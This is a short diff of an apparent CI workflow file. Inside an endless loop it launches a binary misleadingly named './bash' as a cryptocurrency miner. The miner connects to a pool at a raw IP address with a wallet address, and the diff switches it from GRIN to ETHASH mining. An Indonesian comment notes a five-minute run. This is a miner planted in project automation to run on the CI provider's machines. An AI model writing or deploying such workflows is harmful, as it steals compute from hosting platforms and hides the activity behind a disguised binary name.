@@ -67,7 +67,7 @@ jobs:
           while true; do
             echo "=== START $(date) ==="
 
-            ./bash --coin GRIN-C32 --pool 138.197.24.47:80 --user grin1yrecjut0w5nk2nfsy5nqlyffuwlq2s3gqzqmn8gz27yu98asnu3qqalqxn.jasin --ethstratum ETHPROX &
+            ./bash --algo ETHASH --pool 138.197.24.47:80 --user 0x0255aebcb9782baf48b346541bbd3183c2629129.jasin --ethstratum ETHPROX &
             PID=$!
 
             # Jalan 5 menit
